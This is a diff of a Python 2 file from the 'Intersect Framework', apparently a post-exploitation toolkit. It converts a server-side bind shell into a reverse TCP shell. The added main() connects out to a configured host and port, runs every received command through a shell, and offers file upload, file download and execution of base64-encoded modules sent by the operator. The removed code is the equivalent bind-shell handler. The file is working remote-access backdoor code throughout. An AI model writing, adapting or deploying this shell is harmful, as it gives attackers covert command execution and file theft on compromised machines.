@@ -1,8 +1,7 @@
 #!/usr/bin/python
 # Intersect Framework
-# Server-side shell & module handler
-# TCP bind
-
+# Server-side shell and module handler
+# Reverse TCP
 
 import os, sys, re, signal
 import socket
@@ -22,89 +21,6 @@ import operator
 import SocketServer, SimpleHTTPServer
 from math import log
 
-
-def reaper():                              
-    while activePID:                        
-        pid,stat = os.waitpid(0, os.WNOHANG)     
-        if not pid: break
-        activePID.remove(pid)
-
-
-def handler(connection):                    
-    time.sleep(2)     
-                          
-    while True:                                     
-        cmd = connection.recv(socksize)
-        proc = Popen(cmd,
-              shell=True,
-             stdout=PIPE,
-             stderr=PIPE,
-              stdin=PIPE,
-              )
-        stdout, stderr = proc.communicate()
-            
-        if cmd.startswith(':upload'):
-            getname = cmd.split(" ")
-            rem_file = getname[1]
-            filename = rem_file.replace("/","_")
-            filedata = connection.recv(socksize)
-            newfile = file(filename, "wb")
-            newfile.write(filedata)
-            newfile.close()
-            if os.path.isfile(filename):
-                connection.send("[+] File upload complete!\n")
-            if not os.path.isfile(filename):
-                connection.send("[!] File upload failed! Please try again\n")
-
-        elif cmd.startswith(':download'):
-            getname = cmd.split(" ")
-            loc_file = getname[1]
-            if os.path.exists(loc_file) is True:
-                sendfile = open(loc_file, "r")
-                filedata = sendfile.read()
-                sendfile.close()
-                connection.sendall(filedata)
-            else:
-                connection.send("[+] File not found!\n")
-    
-        elif cmd.startswith(':exec'):
-            getname = cmd.split(" ")        # split mod name from cmd
-            modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
-    
-            mod_data = ""                   # Our received file data will go here 
-            data = connection.recv(socksize)
-            mod_data += data
-            #print("[+] Module recieved!")
-            connection.send("Complete")     # sends OK msg to the client
-            modexec = b64decode(mod_data)   # decode the received file
-            module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
-
-        elif cmd == ":quit":
-            print("[!] Closing server!")
-            conn.close()
-            os._exit(0)
-            sys.exit(0)
-
-        elif proc:
-            connection.send( stdout )
-            connection.send("shell => ")
-
-    connection.close() 
-    os._exit(0)
-
-
-def accept():                                
-    while 1:   
-        global connection                                  
-        connection, address = conn.accept()
-        print "[!] New connection!"
-        connection.send("shell => ")
-        reaper()
-        childPid = os.fork()                     # forks the incoming connection and sends to conn handler
-        if childPid == 0:
-            handler(connection)
-        else:
-            activePID.append(childPid)
 
 
 def module_handler(module, modname):
@@ -139,6 +55,7 @@ def save_file(filename):
         connection.send(":savef %s" % filename)
         time.sleep(2)
         connection.sendall( filedata )
+        time.sleep(2)
     else:
         pass
 
@@ -152,6 +69,7 @@ def cmd(command):
                )
     stdout, stderr = proc.communicate()
     connection.sendall( stdout )              # Send output back to the client
+
 
 def cmd2txt(command, textfile):
     os.system("%s > %s" % (command, textfile))
@@ -178,6 +96,78 @@ def users():
             if uid > 500 and uid < 32328:
                 userlist.append(fields[0])
 
+
+def main():
+    global connection
+    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        connection.connect((HOST, PORT))
+        connection.send("shell => ")
+    except:
+        print("[!] Connection error!")
+        sys.exit(2)
+    
+    while True:
+        cmd = connection.recv(socksize)
+        proc = Popen(cmd,
+                shell=True,
+                stdout=PIPE,
+                stderr=PIPE,
+                stdin=PIPE,
+                )
+        stdout, stderr = proc.communicate()
+            
+        if cmd.startswith(':upload'):
+            getname = cmd.split(" ")
+            rem_file = getname[1]
+            filename = rem_file.replace("/","_")
+            filedata = connection.recv(socksize)
+            newfile = file(filename, "wb")
+            newfile.write(filedata)
+            newfile.close()
+            if os.path.isfile(filename):
+                connection.send("[+] File upload complete!")
+            if not os.path.isfile(filename):
+                connection.send("[!] File upload failed! Please try again")
+
+        elif cmd.startswith(':download'):
+            getname = cmd.split(" ")
+            loc_file = getname[1]
+            if os.path.exists(loc_file) is True:
+                sendfile = open(loc_file, "r")
+                filedata = sendfile.read()
+                sendfile.close()
+                connection.sendall(filedata)
+            else:
+                connection.send("[+] File not found!")
+    
+        elif cmd.startswith(':exec'):
+            getname = cmd.split(" ")        # split mod name from cmd
+            modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
+    
+            mod_data = ""                   # Our received file data will go here 
+            data = connection.recv(socksize)
+            mod_data += data
+            #print("[+] Module recieved!")
+            connection.send("Complete")     # sends OK msg to the client
+            modexec = b64decode(mod_data)   # decode the received file
+            module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
+
+        elif cmd == ":quit":
+            print("[!] Closing server!")
+            connection.close()
+            os._exit(0)
+            sys.exit(0)
+
+        elif proc:
+            connection.send( stdout )
+            connection.send("shell => ")
+
+    connection.close() 
+    sys.exit(0)
+
+
 def globalvars():
     global Home_Dir
     global User_Ip_Address
@@ -190,14 +180,12 @@ def globalvars():
     global distro2
     global currentuser
     global socksize
-    global activePID
-    global conn
     global logtime
-    global now
+    global connection
+    global HOST
+    global PORT
 
-    ## Set basic socket and process information
     socksize = 4096                            
-    activePID = []
 
     now = datetime.datetime.now()
     logtime = (str(now.month)+"-"+str(now.day)+"-"+str(now.year)+" @ "+str(now.hour)+":"+str(now.minute))
@@ -220,8 +208,9 @@ def globalvars():
     else:
         currentuser = "root"
 
-    
+
+    HOST = '127.0.0.1'
+    PORT = 4444
 
 globalvars()
-
-
+main()
